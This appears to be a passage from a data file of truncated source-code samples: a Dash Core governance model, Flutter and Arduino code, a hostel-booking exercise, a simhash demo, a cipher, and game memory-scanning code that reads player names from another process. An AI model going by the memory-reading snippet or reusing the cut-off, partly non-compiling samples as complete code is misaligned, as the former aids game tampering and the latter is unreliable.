0xc9,0xfd,0xdc,0x73,0xcf,0xeb,0xf9,0x78,0xcc,0x1f,0xf3,0x98,0xc7,0x34,0x2f,0x6b,\n  0x93,0xf3,0xce,0xb9,0x67,0x91,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,\n  0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,\n  0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,\n  0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,\n  0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,\n  0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,\n  0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,\n  0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,\n  0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,\n  0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,\n  0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,\n  0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,\n  0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x60,0xf,0x59,0x74,0x0,0x90,0x75,0x57,0xdf,\n  0x7e,0x6c,0xe3,0x3,0x5b,0x9f,0x7e,0x68,0x92,0x96,0x9f,0x65,0xa6,0x3,0xcc,0x92,\n  0x3,0x94,0xfa,0x1,0xa9,0xe9,0x0,0x93,0xe,0x90,0xfc,0x0,0xb9,0x1d,0x20,0xd3,\n  0x44,0x49,0x93,0x4c,0x36,0x21,0x95,0x4f,0x34,0x69,0xa2,0xa4,0x9,0x92,0x26,0x49,\n  0x1a,0x2f,0xe9,0x61,0x49,0x95,0x27,0xf8,0x12,0x65,0x97,0x36,0x9b,0x34,0x24,0x69,\n  0x9b,0xcb,0x1e,0x34,0xd7,0x36,0x33,0x1f,0x4c,0x5d,0x7f,0x91,0xe9,0xfe,0x44,0xba,\n  0x5f,0xe6,0xf7,0x2b,0x4d,0xee,0x4f,0x95,0xdc,0x57,0xf0,0x6d,0xf7,0x4d,0x6e,0xfa,\n  0xcb,0x3d,0xe7,0x4d,0xd9,0x34,0x52,0xbd,0xbf,0x9,0x0,0x59,0xc2,0x0,0x0,0x76,\n  0xa2,0xb4,0x7a,0xc6,0x84,0x7d,0x93,0x49,0x47,0xa6,0x5,0x3b,0x32,0x4d,0xd3,0xe7,\n  0x25,0x89,0x9e,0xe9,0xb2,0xc3,0x94,0xea,0xe9,0x32,0x3d,0x53,0xd2,0x21,0xaa,0xcd,\n  0xef,0xa5,0x54,0xf2,0x7b,0xe4,0xfa,0xbd,0xc9,0xfe,0xe0,0xf2,0x3b,0x65,0x76,0xa7,\n  0x5c,0xbf,0xaf,0x24,0x95,0xff,0xd9,0xba,0xff,0xbe,0xbf,0x2a,0x1d,0xb5,0x6c,0x38,\n  0x3a,0x12,0x40,0x8c,0x5a,0xfc,0xa1,0x5,0x84,0xf8,0xe0,0xc0,0xec,0xfd,0x13,0xd3,\n  0x31,0x5,0xf7,0x97,0xba,0xd9,0xb,0xe4,0x7e,0xa4,0xa4,0x23,0x25,0x1d,0xa6,0xfa,\n  0xfc,0x5e,0xa9,0xc8,0xed,0xb7,0x66,0xfe,0x73,0x77,0xff,0xb9,0xc9,0x7e,0x91,0xca,\n  0x7f,0x36,0x61,0x9c,0x7e,0x7c,0xc1,0xf1,0xfd,0xf,0x47,0xc7,0x1,0x18,0x5b,0xf5,\n  0xf8,0x43,0xd,0xd8,0xa9,0xf,0xae,0x9e,0x75,0x44,0x63,0x63,0xe1,0xe5,0xa9,0xd2,\n  0x97,0x29,0xd5,0x31,0x66,0xf6,0x32,0x49,0x87,0x47,0x77,0xd5,0x8,0x97,0xdb,0xaf,\n  0x65,0xfe,0x3d,0xc9,0xbe,0xe7,0x49,0xfa,0xfd,0x64,0xb8,0xe1,0x7b,0x1d,0xad,0x2b,\n  0xee,0x8f,0xe,0x3,0x30,0x7a,0x18,0x0,0xa8,0x7b,0xa5,0xd5,0x33,0x26,0x4c,0x2a,\n  0x4c,0x3c,0x56,0x49,0x72,0x82,0x79,0x3a,0x55,0xb2,0x13,0xb4,0xfd,0xb4,0x3d,0x76,\n  0xcf,0x9d,0x92,0x6e,0x96,0xb4,0x21,0x49,0x7d,0xe0,0x59,0xf7,0x4e,0xfe,0xd1,0xfc,\n  0xf9,0xcb,0x9e,0xe8,0x9a,0x5,0x0,0x19,0xc0,0x0,0x40,0xdd,0xe9,0xbe,0xf1,0x94,\n  0x26,0x6b,0x2a,0xb4,0xa4,0x9e,0x9c,0x28,0xf9,0x34,0x93,0x5e,0x2e,0x69,0x5c,0x74,\n  0x57,0x1d,0xda,0x2c,0xf9,0x46,0x99,0x36,0xc8,0xb,0x3,0xe3,0x37,0x57,0x6e,0xbe,\n  0xa0,0xbd,0x7f,0x5b,0x74,0x14,0x80,0x5d,0xc3,0x0,0x40,0xe6,0x5d,0x77,0xdd,0xbc,\n  0xc2,0x1f,0xe,0x1d,0x3a,0xc6,0xa5,0x93,0x24,0x3f,0x49,0x52,0x51,0xdb,0xaf,0xaa,\n  0x47,0x75,0x6d,0x91,0xb4,0x41,0xb2,0x9b,0x4c,0xba,0x69,0x61,0x73,0xef,0xf7,0xcc,\n  0xe4,0xd1,0x51,0x0,0x9e,0x18,0x3,0x0,0x99,0x74,0xe9,0xba,0xb6,0x83,0x1a,0xcd,\n  0xe6,0x48,0x3e,0x57,0xb2,0x13,0x25,0xed,0x1b,0xdd,0x84,0xc7,0xf9,0xa3,0xc9,0x56,\n  0xa5,0x96,0xae,0x4a,0xb7,0x8c,0xac,0xbc,0xf8,0xe4,0x9b,0x1e,0x8a,0xe,0x2,0xf0,\n  0x37,0xc,0x0,0x64,0xc6,0x15,0x3,0xb3,0x9f,0x53,0x91,0xcf,0x75,0x69,0x8e,0xa4,\n  0x19,0",
    "// Copyright (c) 2021-2022 The Dash Core developers\n// Distributed under the MIT software license, see the accompanying\n// file COPYING or http://www.opensource.org/licenses/mit-license.php.\n\n#include <qt/forms/ui_governancelist.h>\n#include <qt/governancelist.h>\n\n#include <chainparams.h>\n#include <clientversion.h>\n#include <coins.h>\n#include <evo/deterministicmns.h>\n#include <netbase.h>\n#include <qt/clientmodel.h>\n#include <qt/guiutil.h>\n\n#include <univalue.h>\n\n#include <QAbstractItemView>\n#include <QDesktopServices>\n#include <QMessageBox>\n#include <QTableWidgetItem>\n#include <QUrl>\n#include <QtGui/QClipboard>\n\n///\n/// Proposal wrapper\n///\n\nProposal::Proposal(const CGovernanceObject& _govObj, QObject* parent) :\n    QObject(parent),\n    govObj(_govObj)\n{\n    UniValue prop_data;\n    if (prop_data.read(govObj.GetDataAsPlainString())) {\n        if (UniValue titleValue = find_value(prop_data, \"name\"); titleValue.isStr()) {\n            m_title = QString::fromStdString(titleValue.get_str());\n        }\n\n        if (UniValue paymentStartValue = find_value(prop_data, \"start_epoch\"); paymentStartValue.isNum()) {\n            m_startDate = QDateTime::fromSecsSinceEpoch(paymentStartValue.get_int64());\n        }\n\n        if (UniValue paymentEndValue = find_value(prop_data, \"end_epoch\"); paymentEndValue.isNum()) {\n            m_endDate = QDateTime::fromSecsSinceEpoch(paymentEndValue.get_int64());\n        }\n\n        if (UniValue amountValue = find_value(prop_data, \"payment_amount\"); amountValue.isNum()) {\n            m_paymentAmount = amountValue.get_real();\n        }\n\n        if (UniValue urlValue = find_value(prop_data, \"url\"); urlValue.isStr()) {\n            m_url = QString::fromStdString(urlValue.get_str());\n        }\n    }\n}\n\nQString Proposal::title() const { return m_title; }\n\nQString Proposal::hash() const { return QString::fromStdString(govObj.GetHash().ToString()); }\n\nQDateTime Proposal::startDate() const { return m_startDate; }\n\nQDateTime Proposal::endDate() const { return m_endDate; }\n\nfloat Proposal::paymentAmount() const { return m_paymentAmount; }\n\nQString Proposal::url() const { return m_url; }\n\nbool Proposal::isActive() const\n{\n    LOCK(cs_main);\n    std::string strError;\n    return govObj.IsValidLocally(strError, false);\n}\n\nQString Proposal::votingStatus(const int nAbsVoteReq) const\n{\n    // Voting status...\n    // TODO: determine if voting is in progress vs. funded or not funded for past proposals.\n    // see CSuperblock::GetNearestSuperblocksHeights(nBlockHeight, nLastSuperblock, nNextSuperblock);\n    const int absYesCount = govObj.GetAbsoluteYesCount(VOTE_SIGNAL_FUNDING);\n    QString qStatusString;\n    if (absYesCount >= nAbsVoteReq) {\n        // Could use govObj.IsSetCachedFunding here, but need nAbsVoteReq to display numbers anyway.\n        return tr(\"Passing +%1\").arg(absYesCount - nAbsVoteReq);\n    } else {\n        return tr(\"Needs additional %1 votes\").arg(nAbsVoteReq - absYesCount);\n    }\n}\n\nint Proposal::GetAbsoluteYesCount() const\n{\n    return govObj.GetAbsoluteYesCount(VOTE_SIGNAL_FUNDING);\n}\n\nvoid Proposal::openUrl() const\n{\n    QDesktopServices::openUrl(QUrl(m_url));\n}\n\nQString Proposal::toJson() const\n{\n    const auto json = govObj.ToJson();\n    return QString::fromStdString(json.write(2));\n}\n\n///\n/// Proposal Model\n///\n\n\nint ProposalModel::rowCount(const QModelIndex& index) const\n{\n    return m_data.count();\n}\n\nint ProposalModel::columnCount(const QModelIndex& index) const\n{\n    return Column::_COUNT;\n}\n\nQVariant ProposalModel::data(const QModelIndex& index, int role) const\n{\n    if (role != Qt::DisplayRole && role != Qt::EditRole) return {};\n    const auto proposal = m_data[index.row()];\n    switch(role) {\n    case Qt::DisplayRole:\n    {\n        switch (index.column()) {\n        case Column::HASH:\n            return proposal->hash();\n        case Column::TITLE:\n            return proposal->title();\n        case Column::START_DATE:\n            return proposal->startDate().date();\n        case Column::END_DATE:\n            return proposal->endDate().date();\n        case Column::PAYMENT_AMOUNT:\n            return proposal->paymentAmount();\n        case Column::IS_ACTIVE:\n            return proposal->isActive() ? tr(\"Yes\") : tr(\"No\");\n        case Column::VOTING_STATUS:\n            return proposal->votingStatus(nAbsVoteReq);\n        default:\n            return {};\n        };\n        break;\n    }\n    case Qt::EditRole:\n    {\n        // Edit role is used for sorting, so return the raw values where possible\n        switch (index.column()) {\n        case Column::HASH:\n            return proposal->hash();\n        case Column::TITLE:\n            return proposal->title();\n        case Column::START_DATE:\n            return proposal->startDate();\n        case Column::END_DATE:\n            return proposal->endDate();\n        case Column::PAYMENT_AMOUNT:\n            return proposal->paymentAmount();\n        case Column::IS_ACTIVE:\n            return proposal->isActive();\n        case Column::VOTING_STATU",
    "#include <flutter/dart_project.h>\r\n#include <flutter/flutter_view_controller.h>\r\n#include <windows.h>\r\n\r\n#include \"flutter_window.h\"\r\n#include \"utils.h\"\r\n\r\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\r\n                      _In_ wchar_t *command_line, _In_ int show_command) {\r\n  // Attach to console when present (e.g., 'flutter run') or create a\r\n  // new console when running with a debugger.\r\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\r\n    CreateAndAttachConsole();\r\n  }\r\n\r\n  // Initialize COM, so that it is available for use in the library and/or\r\n  // plugins.\r\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\r\n\r\n  flutter::DartProject project(L\"data\");\r\n\r\n  std::vector<std::string> command_line_arguments =\r\n      GetCommandLineArguments();\r\n\r\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\r\n\r\n  FlutterWindow window(project);\r\n  Win32Window::Point origin(10, 10);\r\n  Win32Window::Size size(1280, 720);\r\n  if (!window.Create(L\"flutter_day_night\", origin, size)) {\r\n    return EXIT_FAILURE;\r\n  }\r\n  window.SetQuitOnClose(true);\r\n\r\n  ::MSG msg;\r\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\r\n    ::TranslateMessage(&msg);\r\n    ::DispatchMessage(&msg);\r\n  }\r\n\r\n  ::CoUninitialize();\r\n  return EXIT_SUCCESS;\r\n}\r\n",
    "/*\n  Copyright (c) 2017 Arduino LLC.  All right reserved.\n\n  This library is free software; you can redistribute it and/or\n  modify it under the terms of the GNU Lesser General Public\n  License as published by the Free Software Foundation; either\n  version 2.1 of the License, or (at your option) any later version.\n\n  This library is distributed in the hope that it will be useful,\n  but WITHOUT ANY WARRANTY; without even the implied warranty of\n  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.\n  See the GNU Lesser General Public License for more details.\n\n  You should have received a copy of the GNU Lesser General Public\n  License along with this library; if not, write to the Free Software\n  Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA\n*/\n\n#include <Arduino.h>\n\n#include \"InternalStorage.h\"\n\n#define PAGE_SIZE (64)\n#define PAGES (4096)\n#define MAX_FLASH (PAGE_SIZE * PAGES)\n#define ROW_SIZE (PAGE_SIZE * 4)\n\n#define SKETCH_START_ADDRESS (0x2000)\n#define MAX_PARTIONED_SKETCH_SIZE ((MAX_FLASH - SKETCH_START_ADDRESS) / 2)\n#define STORAGE_START_ADDRESS (SKETCH_START_ADDRESS + MAX_PARTIONED_SKETCH_SIZE)\n\nextern \"C\"\n{\n  // these functions must be in RAM (.data) and NOT inlined\n  // as they erase and copy the sketch data in flash\n\n  __attribute__((long_call, noinline, section(\".data#\"))) static void eraseFlash(int address, int length)\n  {\n    for (int i = 0; i < length; i += ROW_SIZE)\n    {\n      NVMCTRL->ADDR.reg = ((uint32_t)(address + i)) / 2;\n      NVMCTRL->CTRLA.reg = NVMCTRL_CTRLA_CMDEX_KEY | NVMCTRL_CTRLA_CMD_ER;\n\n      while (!NVMCTRL->INTFLAG.bit.READY)\n        ;\n    }\n  }\n\n  __attribute__((long_call, noinline, section(\".data#\"))) static void copyFlashAndReset(int dest, int src, int length)\n  {\n    uint32_t *d = (uint32_t *)dest;\n    uint32_t *s = (uint32_t *)src;\n\n    eraseFlash(dest, length);\n\n    for (int i = 0; i < length; i += 4)\n    {\n      *d++ = *s++;\n\n      while (!NVMCTRL->INTFLAG.bit.READY)\n        ;\n    }\n\n    NVIC_SystemReset();\n  }\n}\n\nint InternalStorageClass::open(int size)\n{\n  (void)size;\n  _writeIndex = 0;\n  _writeAddress = (uint32_t *)STORAGE_START_ADDRESS;\n\n  // enable auto page writes\n  NVMCTRL->CTRLB.bit.MANW = 0;\n\n  eraseFlash(STORAGE_START_ADDRESS, MAX_PARTIONED_SKETCH_SIZE);\n\n  return 1;\n}\n\nsize_t InternalStorageClass::write(uint8_t b)\n{\n  _addressData.u8[_writeIndex] = b;\n  _writeIndex++;\n\n  if (_writeIndex == 4)\n  {\n    _writeIndex = 0;\n\n    *_writeAddress = _addressData.u32;\n\n    _writeAddress++;\n\n    while (!NVMCTRL->INTFLAG.bit.READY)\n      ;\n  }\n\n  return 1;\n}\n\nvoid InternalStorageClass::close()\n{\n  while ((int)_writeAddress % PAGE_SIZE)\n  {\n    write(0xff);\n  }\n}\n\nvoid InternalStorageClass::clear()\n{\n}\n\nvoid InternalStorageClass::apply()\n{\n  // disable interrupts, as vector table will be erase during flash sequence\n  noInterrupts();\n\n  copyFlashAndReset(SKETCH_START_ADDRESS, STORAGE_START_ADDRESS, MAX_PARTIONED_SKETCH_SIZE);\n}\n\nlong InternalStorageClass::maxSize()\n{\n  return MAX_PARTIONED_SKETCH_SIZE;\n}\n\nInternalStorageClass InternalStorage;\n",
    "#include <iostream> // Input-output stream\r\n#include <fstream> // File stream\r\n#include <windows.h> // Windows-specific functions\r\n#include <sstream> // String stream for conversions\r\nusing namespace std;\r\n\r\nclass Hostel{\r\n\r\n    private:\r\n        string Name; // Name of the hostel\r\n        int Rent, Bed; // Rent and number of beds\r\n    public:\r\n        // Constructor to initialize hostel details\r\n        Hostel(string name, int rent, int bed)\r\n        {\r\n            Name = name;\r\n            Rent = rent;\r\n            Bed = bed;\r\n        }\r\n\r\n    // Getter functions for hostel attributes\r\n    string getName() // Returns the name of the hostel\r\n    {\r\n        return Name;\r\n    }\r\n\r\n    int getRent() // Returns the rent of the hostel\r\n    {\r\n        return Rent;\r\n    }\r\n\r\n    int getBed() // Returns the number of available beds\r\n    {\r\n        return Bed;\r\n    }\r\n\r\n    // Function to reserve a bed in the hostel\r\n    reserve()\r\n    {\r\n        // Opening input and output file streams\r\n        ifstream in(\"D:/Hostel.txt\");\r\n        ofstream out(\"D:/Hostel Temp.txt\");\r\n\r\n        string line;\r\n        // Reading each line from input file\r\n        while(getline(in,line))\r\n            {\r\n                // Finding the hostel name in the line\r\n                int pos = line.find(\"3star\");\r\n                // If hostel name found\r\n                if(pos != string::npos)\r\n                {\r\n                    // Decrease the bed count by 1\r\n                    int bed = Bed-1;\r\n                    Bed = bed;\r\n                    // Convert bed count to string\r\n                    stringstream ss;\r\n                    ss<<bed;\r\n                    string strBed = ss.str();\r\n                    // Find position to replace bed count in the line\r\n                    int bedPos = line.find_last_of(':');\r\n                    line.replace(bedPos+1, string::npos, strBed);\r\n                }\r\n                // Write updated line to output file\r\n                out<<line<<endl;\r\n            }\r\n\r\n        // Close file streams\r\n        out.close();\r\n        in.close();\r\n        // Remove original file and rename temporary file\r\n        remove(\"D:/Hostel.txt\");\r\n        rename(\"D:/Hostel Temp.txt\", \"D:/Hostel.txt\");\r\n        // Print reservation success message\r\n        cout<<\"\\tBed Reserved Successfuly!\"<<endl;\r\n    }\r\n};\r\n\r\nclass Student{\r\n\r\n    private:\r\n        string Name, RollNo, Address; // Student details: name, roll number, address\r\n    public:\r\n        // Default constructor to initialize student details\r\n        Student()\r\n        {\r\n            Name=\"\";\r\n            RollNo=\"\";\r\n            Address=\"\";\r\n        }\r\n\r\n    // Setter functions for student attributes\r\n    setName(string name) // Set student name\r\n    {\r\n        Name = name;\r\n    }\r\n\r\n    setRollNo(string rollNo) // Set student roll number\r\n    {\r\n        RollNo = rollNo;\r\n    }\r\n\r\n    setAddress(string address) // Set student address\r\n    {\r\n        Address = address;\r\n    }\r\n\r\n    // Getter functions for student attributes\r\n    string getName() // Get student name\r\n    {\r\n        return Name;\r\n    }\r\n\r\n    string getRollNo() // Get student roll number\r\n    {\r\n        return RollNo;\r\n    }\r\n\r\n    string getAddress() // Get student address\r\n    {\r\n        return Address;\r\n    }\r\n\r\n};\r\n\r\n// Main function to run the program\r\nint main(){\r\n\r\n    // Create a Hostel object with initial details\r\n    Hostel h(\"3star\", 5000, 2);\r\n    // Open a file stream to save hostel data\r\n    ofstream out(\"D:/Hostel.txt\");\r\n    // Write hostel details to the file\r\n    out<<\"\\t\"<<h.getName()<<\" : \"<<h.getRent()<<\" : \"<<h.getBed()<<endl<<endl;\r\n    // Print confirmation message\r\n    cout<<\"Hostel Data Saved\"<<endl;\r\n    // Close file stream\r\n    out.close();\r\n\r\n    // Create a Student object\r\n    Student s;\r\n\r\n    // Boolean variable to control the loop\r\n    bool exit = false;\r\n\r\n    // Main menu loop\r\n    while(!exit)\r\n        {\r\n            // Clear the console screen\r\n            system(\"cls\");\r\n            int val;\r\n            // Print menu options\r\n            cout<<\"\\tWelcome To Hostel Accommodation System\"<<endl;\r\n            cout<<\"\\t**************************************\"<<endl;\r\n            cout<<\"\\t1.Reserve A Bed.\"<<endl;\r\n            cout<<\"\\t2.Exit.\"<<endl;\r\n            cout<<\"\\tEnter Choice: \";\r\n            // Read user choice\r\n            cin>>val;\r\n\r\n            // If user chooses option 1 (Reserve A Bed)\r\n            if(val==1)\r\n            {\r\n                // Clear the console screen\r\n                system(\"cls\");\r\n                string name,rollNo, address;\r\n                // Prompt user to enter student details\r\n                cout<<\"\\tEnter Name of Student: \";\r\n                cin>>name;\r\n                s.setName(name);\r\n\r\n                cout<<\"\\tEnter RollNo of Student: \";\r\n                cin>>rollNo;\r\n                s.setRollNo(rollNo);\r\n\r\n                cout<<\"\\tEnter Address of Student: \";\r\n                cin>>address;\r\n                s.setAdd",
    "#include <iostream>\n#include <fstream>\n\n//this define can avoid some logs which you don't need to care about.\n#define LOGGER_LEVEL LL_WARN \n\n#include \"include/simhash/Simhasher.hpp\"\nusing namespace simhash;\n\nint main(int argc, char** argv)\n{\n    Simhasher simhasher(\"./dict/jieba.dict.utf8\", \"./dict/hmm_model.utf8\", \"./dict/idf.utf8\", \"./dict/stop_words.utf8\");\n    string s(\"\u6211\u662f\u84dd\u7fd4\u6280\u5de5\u62d6\u62c9\u673a\u5b66\u9662\u624b\u6276\u62d6\u62c9\u673a\u4e13\u4e1a\u7684\u3002\u4e0d\u7528\u591a\u4e45\uff0c\u6211\u5c31\u4f1a\u5347\u804c\u52a0\u85aa\uff0c\u5f53\u4e0a\u603b\u7ecf\u7406\uff0c\u51fa\u4efbCEO\uff0c\u8d70\u4e0a\u4eba\u751f\u5dc5\u5cf0\u3002\");\n    size_t topN = 5;\n    uint64_t u64 = 0;\n    vector<pair<string ,double> > res;\n    simhasher.extract(s, res, topN);\n    simhasher.make(s, topN, u64);\n    cout<< \"\u6587\u672c\uff1a\\\"\" << s << \"\\\"\" << endl;\n    cout << \"\u5173\u952e\u8bcd\u5e8f\u5217\u662f: \" << res << endl;\n    cout<< \"simhash\u503c\u662f: \" << u64<<endl;\n\n\n    const char * bin1 = \"100010110110\";\n    const char * bin2 = \"110001110011\";\n    uint64_t u1, u2;\n    u1 = Simhasher::binaryStringToUint64(bin1); \n    u2 = Simhasher::binaryStringToUint64(bin2); \n    \n    cout<< bin1 << \"\u548c\" << bin2 << \" simhash\u503c\u7684\u76f8\u7b49\u5224\u65ad\u5982\u4e0b\uff1a\"<<endl;\n    cout<< \"\u6d77\u660e\u8ddd\u79bb\u9608\u503c\u9ed8\u8ba4\u8bbe\u7f6e\u4e3a3\uff0c\u5219isEqual\u7ed3\u679c\u4e3a\uff1a\" << (Simhasher::isEqual(u1, u2)) << endl; \n    cout<< \"\u6d77\u660e\u8ddd\u79bb\u9608\u503c\u9ed8\u8ba4\u8bbe\u7f6e\u4e3a5\uff0c\u5219isEqual\u7ed3\u679c\u4e3a\uff1a\" << (Simhasher::isEqual(u1, u2, 5)) << endl; \n    return EXIT_SUCCESS;\n}\n",
    "#include \"MemoryUtility.h\"\n#include <vector>\n#include <thread>\n#include <chrono>\n#include <Utils.h>\n\nconst char* gameManPattern = \"\\x48\\x8B\\x05\\x00\\x00\\x00\\x00\\x80\\xB8\\x00\\x00\\x00\\x00\\x0D\\x0F\\x94\\xC0\\xC3\";\nconst char* gameManMask = \"xxx????xx????xxxx\";\nconst char* gameDataManPattern = \"\\x48\\x8B\\x05\\x00\\x00\\x00\\x00\\x48\\x85\\xC0\\x74\\x05\\x48\\x8B\\x40\\x58\\xC3\\xC3\";\nconst char* gameDataManMask = \"xxx????xxxxxxxxxx\";\nconst char* worldChrManPattern = \"\\x48\\x8B\\x05\\x00\\x00\\x00\\x00\\x48\\x85\\xC0\\x74\\x0F\\x48\\x39\\x88\";\nconst char* worldChrManMask = \"xxx????xxxxxxx\";\n\nDWORD_PTR MemoryUtility::gameManAddress = 0;\nDWORD_PTR MemoryUtility::gameDataManAddress = 0;\nDWORD_PTR MemoryUtility::worldChrManAddress = 0;\n\nusing namespace Utils;\n\n// Function to read an int from memory\nint MemoryUtility::ReadInt32(DWORD_PTR address) {\n    if (address == 0) {\n        return static_cast<int>(0);\n    }\n\n    int value = static_cast<int>(0);\n    __try {\n        value = *(int*)address;\n    }\n    __except (EXCEPTION_EXECUTE_HANDLER) {\n        return static_cast<int>(0);\n    }\n\n    return value;\n}\n\nlong long MemoryUtility::ReadInt64(DWORD_PTR address) {\n    if (address == 0) {\n        return static_cast<long long>(0);\n    }\n\n    long long value = static_cast<long long>(0);\n    __try {\n        value = *(long long*)address;\n    }\n    __except (EXCEPTION_EXECUTE_HANDLER) {\n        return static_cast<long long>(0);\n    }\n\n    return value;\n}\n\n\nBYTE MemoryUtility::ReadByte(DWORD_PTR address) {\n    if (address == 0) {\n        return static_cast<BYTE>(0);\n    }\n\n    BYTE value = static_cast<BYTE>(0);\n    __try {\n        value = *(BYTE*)address;\n    }\n    __except (EXCEPTION_EXECUTE_HANDLER) {\n        return static_cast<BYTE>(0);\n    }\n\n    return value;\n}\n\n// Function to read a string from the specified memory address\nstd::string MemoryUtility::ReadString(DWORD_PTR address, int length) {\n    if (address == 0) {\n\t\treturn \"\";\n\t}\n    if (!IsValidAddress(address)) {\n        return \"\";\n    }\n\n    std::vector<wchar_t> buffer(length);\n    for (int i = 0; i < length; ++i) {\n        if (IsBadReadPtr((void*)(address + i * sizeof(wchar_t)), sizeof(wchar_t))) {\n            return \"\";\n        }\n        buffer[i] = *(wchar_t*)(address + i * sizeof(wchar_t));\n    }\n    std::wstring wstr(buffer.begin(), buffer.end());\n    int size_needed = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, NULL, 0, NULL, NULL);\n    std::string strTo(size_needed, 0);\n    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, &strTo[0], size_needed, NULL, NULL);\n    return strTo;\n}\n\n// Function to read a player's name\nstd::string MemoryUtility::ReadPlayerName(int playerIndex) {\n    if (worldChrManAddress == 0) {\n        return \"\";\n    }\n\n    std::string value = \"\";\n    DWORD_PTR mainAddressValue = ReadInt64(worldChrManAddress);\n\n    if (!IsValidAddress(mainAddressValue)) {\n        return \"\";\n    }\n    mainAddressValue = ReadInt64(mainAddressValue + 0x10EF8);\n\n    if (!IsValidAddress(mainAddressValue)) {\n        return \"\";\n    }\n    mainAddressValue = ReadInt64(mainAddressValue + (playerIndex * 0x10));\n\n    if (!IsValidAddress(mainAddressValue)) {\n        return \"\";\n    }\n    mainAddressValue = ReadInt64(mainAddressValue + 0x580);\n\n    if (!IsValidAddress(mainAddressValue)) {\n        return \"\";\n    }\n    value = ReadString(mainAddressValue + 0x9C, 32);\n\n    return value;\n}\n\n\nint MemoryUtility::CountNetPlayers() {\n    int netPlayerCount = 0;\n    int maxPlayers = 10;\n\n    for (int i = 0; i <= maxPlayers; ++i) {\n        std::string playerName = ReadPlayerName(i);\n        if (playerName != \"\") {\n            netPlayerCount++;\n        }\n        else {\n            break;\n        }\n    }\n\n    return netPlayerCount;\n}\n\nDWORD_PTR MemoryUtility::GetModuleBaseAddress()\n{\n\treturn reinterpret_cast<DWORD_PTR>(GetModuleHandle(NULL));\n}\n\nDWORD_PTR MemoryUtility::FindPattern(DWORD_PTR base, DWORD size, const char* pattern, const char* mask) {\n    DWORD patternLength = (DWORD)strlen(mask);\n    for (DWORD i = 0; i < size - patternLength; i++) {\n        bool found = true;\n        for (DWORD j = 0; j < patternLength; j++) {\n            if (mask[j] != '?' && pattern[j] != *(char*)(base + i + j)) {\n                found = false;\n                break;\n            }\n        }\n        if (found) {\n            return base + i;\n        }\n    }\n    return 0;\n}\n\nDWORD_PTR MemoryUtility::CalculateAddress(HANDLE hProcess, DWORD_PTR base, const char* pattern, const char* mask, int patternOffset, int addressAdjustment) {\n    DWORD moduleSize = 0x1000000; // Assuming module size\n    std::vector<byte> moduleMemory(moduleSize);\n    ReadProcessMemory(hProcess, (LPCVOID)base, moduleMemory.data(), moduleSize, NULL);\n\n    DWORD_PTR patternAddress = FindPattern((DWORD_PTR)moduleMemory.data(), moduleSize, pattern, mask);\n    if (patternAddress == 0) {\n        return 0;\n    }\n\n    int offset = *(int*)(patternAddress + patternOffset);\n    return base + (patternAddress - (DWORD_PTR)moduleMemory.data()) + offset + addressAdjustment;\n}\n\nlon",
    "#include<iostream>\r\n#include<cstring>\r\n#include<limits>\r\nusing namespace std;\r\n\r\nvoid cipher_key(char key[6][6], const string& userInput) \r\n{\r\n    int index = 0;\r\n    \r\n    char charArray[userInput.length() + 1];\r\n    strcpy(charArray, userInput.c_str());\r\n\r\n    for (size_t i = 0; i < userInput.length(); ++i) \r\n        if (charArray[i] >= 'a' && charArray[i] <= 'z') \r\n            charArray[i] -= 32;\r\n            \r\n\r\n    for (char ch : charArray) \r\n    {\r\n        if ((ch >= 'A' && ch <= 'Z') || (ch >= '0' && ch <= '9')) \r\n        {\r\n            bool found = false;\r\n            for (int i = 0; i < index; ++i) \r\n            {\r\n                if (key[i / 6][i % 6] == ch) \r\n                {\r\n                    found = true;\r\n                    break;\r\n                }\r\n            }\r\n            if (!found && index < 36) \r\n            {\r\n                key[index / 6][index % 6] = ch;\r\n                index++;\r\n            }\r\n        }\r\n    }\r\n\r\n    char current_Ch = 'A';\r\n    while (index < 36) {\r\n        bool found = false;\r\n        for (int i = 0; i < index; ++i) \r\n        {\r\n            if (key[i / 6][i % 6] == current_Ch) \r\n            {\r\n                found = true;\r\n                break;\r\n            }\r\n        }\r\n        if (!found && (current_Ch >= 'A' && current_Ch <= 'Z')) \r\n        {\r\n            key[index / 6][index % 6] = current_Ch;\r\n            index++;\r\n        } else if (!found && (current_Ch >= '0' && current_Ch <= '9')) \r\n        {\r\n            key[index / 6][index % 6] = current_Ch;\r\n            index++;\r\n        }\r\n        current_Ch++;\r\n        if (current_Ch == '[')\r\n            current_Ch = '0';\r\n    }\r\n}\r\n\r\nint main() {\r\n    char key[6][6];\r\n    \r\n    cout << \" Hello and Welcome :) \" << endl;\r\n    \r\n    cout << \"Enter an 